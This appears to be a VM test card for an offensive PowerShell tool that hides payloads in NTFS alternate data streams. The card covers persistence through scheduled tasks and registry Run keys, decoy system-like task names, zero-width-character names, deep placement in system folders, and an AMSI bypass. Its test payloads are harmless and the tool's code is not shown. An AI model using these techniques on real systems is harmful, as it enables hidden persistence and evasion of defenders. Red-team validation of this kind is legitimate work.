# VM Testing Quick Reference: -Obfuscate Parameter

**Use this card during VM validation to quickly verify expected behaviors.**

---

## Test 1: Backward Compatibility (`-Obfuscate None`)

**Generate:**
```bash
pwsh ./src/ADS-OneLiner.ps1 \
  -Obfuscate None \
  -Payload 'Write-Host "None-Test" -ForegroundColor Green' \
  -Persist task \
  -OutputFile vm-test1.txt
```

**Deploy:** Copy OPTION 1 from `vm-test1.txt` to Windows VM, run in PowerShell.

**Verify on VM:**
```powershell
# Should find task with legacy name
Get-ScheduledTask -TaskName 'SystemOptimization'

# Host file should be at default path
Get-Item 'C:\ProgramData\SystemCache.dat' -Stream *

# JScript wrapper should contain legacy function names (if encrypted)
Get-ChildItem 'C:\ProgramData' -Filter '*.js' | Get-Content | Select-String 'function GHK'

# Cleanup (from manifest)
$sn = 'payload'  # or from manifest StreamNameEscaped
Unregister-ScheduledTask -TaskName 'SystemOptimization' -Confirm:$false
Remove-Item 'C:\ProgramData\SystemCache.dat' -Force
Get-ChildItem 'C:\ProgramData' -Filter '*.js' | Remove-Item -Force
```

**PASS if:** Task name = `SystemOptimization`, functions = `GHK`/`Dec`, no deep placement.

---

## Test 2: Advanced Tier + Registry Persistence

**Generate:**
```bash
pwsh ./src/ADS-OneLiner.ps1 \
  -Obfuscate Advanced \
  -Payload 'Write-Host "Advanced-Test" -ForegroundColor Cyan' \
  -Persist registry \
  -Trigger AtLogOn,AtStartup,OnIdle \
  -Encrypt \
  -OutputFile vm-test2.txt
```

**Deploy:** Copy OPTION 1 from `vm-test2.txt` to Windows VM, run in PowerShell.

**Verify on VM:**
```powershell
# Check registry Run key
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' | Format-List

# If admin, check HKLM too
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -EA 0 | Format-List

# Find companion task (name from manifest)
Get-ScheduledTask | Where-Object { $_.TaskName -match 'Disk|TPM|Network|Memory' }

# Check if JScript wrapper is in deep directory
Get-ChildItem -Path 'C:\ProgramData\Microsoft\Windows\WER' -Recurse -Filter '*.js' -EA 0

# Test execution via registry (logoff/logon) or companion task
Start-ScheduledTask -TaskName '<CompanionTaskName>'  # Replace with actual name

# Cleanup (get names from manifest)
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name '<TaskName>' -EA 0
Remove-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name '<TaskName>' -EA 0
Unregister-ScheduledTask -TaskName '<TaskName>-Monitor' -Confirm:$false -EA 0
# Clean up ADS and JScript wrapper using manifest codepoints/paths
```

**PASS if:** Registry key created, companion task registered, obfuscated names, deep placement active, execution succeeds.

---

## Test 3: Paranoid Tier + Zero-Width Chars

**Generate:**
```bash
pwsh ./src/ADS-OneLiner.ps1 \
  -Obfuscate Paranoid \
  -Payload 'Write-Host "Paranoid-Test" -ForegroundColor Magenta' \
  -Persist task \
  -Trigger AtLogOn,OnUnlock \
  -Encrypt \
  -OutputFile vm-test3.txt
```

**Deploy:** Copy OPTION 1 from `vm-test3.txt` to Windows VM, run in PowerShell.

**Verify on VM:**
```powershell
# Find task (name may contain zero-width chars — use pattern matching)
Get-ScheduledTask | Where-Object { $_.TaskName -match 'TPM|Defender|Disk|Network' } | Format-List TaskName

# Check for zero-width chars in task name (export to manifest)
$task = Get-ScheduledTask | Where-Object { $_.TaskName -match 'TPM|Defender' } | Select-Object -First 1
$taskName = $task.TaskName
$bytes = [System.Text.Encoding]::Unicode.GetBytes($taskName)
$codepoints = ($taskName.ToCharArray() | ForEach-Object { "U+{0:X4}" -f [int]$_ }) -join ' '
Write-Host "Task name codepoints: $codepoints"

# Verify ADS stream has zero-width name
$hp = 'C:\ProgramData\...'  # Get from manifest or runtime detection
Get-Item $hp -Stream * | Format-Table Stream, Length

# Verify JScript wrapper does NOT have ZW in function names (should parse cleanly)
$js = Get-ChildItem 'C:\ProgramData' -Recurse -Filter '*.js' | Select-Object -First 1
$jsContent = Get-Content $js.FullName -Raw
# Should find function definitions without parse errors
$jsContent | Select-String 'function'

# Test execution
Start-ScheduledTask -TaskName $taskName

# Cleanup using codepoint reconstruction from manifest
$sn = -join @([char]0x200B)  # Example: single ZW char from manifest codepoints
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
Remove-Item "$hp`:$sn" -Force
Get-ChildItem 'C:\ProgramData' -Recurse -Filter '*.js' | Remove-Item -Force
```

**PASS if:** Task name contains ZW chars, function names clean (Verb-Noun), execution succeeds, cleanup with codepoint reconstruction works.

---

## Test 4: Override Behavior

**Generate:**
```bash
pwsh ./src/ADS-OneLiner.ps1 \
  -Obfuscate Advanced \
  -UseDeepPlacement:$false \
  -AttachToExisting:$false \
  -Randomize:$false \
  -Payload 'Write-Host "Override-Test" -ForegroundColor Yellow' \
  -Persist task \
  -OutputFile vm-test4.txt
```

**Deploy:** Copy OPTION 1 from `vm-test4.txt` to Windows VM, run in PowerShell.

**Verify on VM:**
```powershell
# Host file should be at DEFAULT path (not deep placement)
Get-Item 'C:\ProgramData\SystemCache.dat' -Stream *

# Task name should still be obfuscated
Get-ScheduledTask | Where-Object { $_.TaskName -match 'Disk|TPM|Network' }

# Stream name should be static (not randomized)
Get-Item 'C:\ProgramData\SystemCache.dat' -Stream * | Select-Object Stream

# Cleanup
$tn = Get-ScheduledTask | Where-Object { $_.TaskName -match 'Disk|TPM' } | Select-Object -ExpandProperty TaskName
Unregister-ScheduledTask -TaskName $tn -Confirm:$false
Remove-Item 'C:\ProgramData\SystemCache.dat' -Force
Get-ChildItem 'C:\ProgramData' -Filter '*.js' | Remove-Item -Force
```

**PASS if:** Obfuscated names used, but deep placement/attach/randomize are disabled.

---

## Common Verification Commands

**Find scheduled tasks created by ADS:**
```powershell
Get-ScheduledTask | Where-Object {
  $_.TaskName -match 'System|Disk|TPM|Network|Defender|Memory|USB|WinSAT'
} | Format-Table TaskName, State, LastRunTime
```

**Find ADS streams in ProgramData:**
```powershell
Get-ChildItem 'C:\ProgramData' -Recurse -File -EA 0 | ForEach-Object {
  $streams = Get-Item $_.FullName -Stream * -EA 0 | Where-Object { $_.Stream -ne ':$DATA' }
  if ($streams) {
    Write-Host "File: $($_.FullName)"
    $streams | Format-Table Stream, Length
  }
}
```

**Find JScript wrappers:**
```powershell
Get-ChildItem 'C:\ProgramData' -Recurse -Filter '*.js' -EA 0 | Select-Object FullName, Length, LastWriteTime
```

**Check registry Run keys:**
```powershell
Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' | Format-List
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -EA 0 | Format-List
```

**Reconstruct zero-width stream name from manifest codepoints:**
```powershell
# Example: "U+200B U+200C" from manifest
$codepoints = "U+200B U+200C"
$points = $codepoints -split '\s+' | ForEach-Object {
  $cleaned = $_ -replace '^U\+', ''
  [int]"0x$cleaned"
}
$sn = -join ($points | ForEach-Object { [char]$_ })
Write-Host "Stream name: [$sn]"
```

---

## Snapshot Workflow

1. **Take clean snapshot** before Test 1 (name: `Pre-Obfuscate-Tests`)
2. **Restore snapshot** between each test to avoid artifact conflicts
3. **Take final snapshot** after all tests pass (name: `Obfuscate-Validated`)

---

## Expected Test Duration

- Test 1 (None): 5-7 minutes
- Test 2 (Advanced + Registry): 10-12 minutes
- Test 3 (Paranoid): 8-10 minutes
- Test 4 (Override): 5-7 minutes

**Total VM time: 30-40 minutes**

---

## Troubleshooting

**Issue:** Task not executing
**Check:** JScript wrapper syntax, function names in wrapper, AMSI bypass layer B

**Issue:** Registry Run key not firing
**Check:** Log off and log back on, or reboot for HKLM Run key

**Issue:** Zero-width cleanup fails
**Check:** Manifest codepoints field, reconstruct stream name exactly as shown above

**Issue:** Deep placement not working
**Check:** Diagnostic directories exist (`Test-Path 'C:\ProgramData\Microsoft\Windows\WER\Temp'`)

---

**End of Quick Reference**
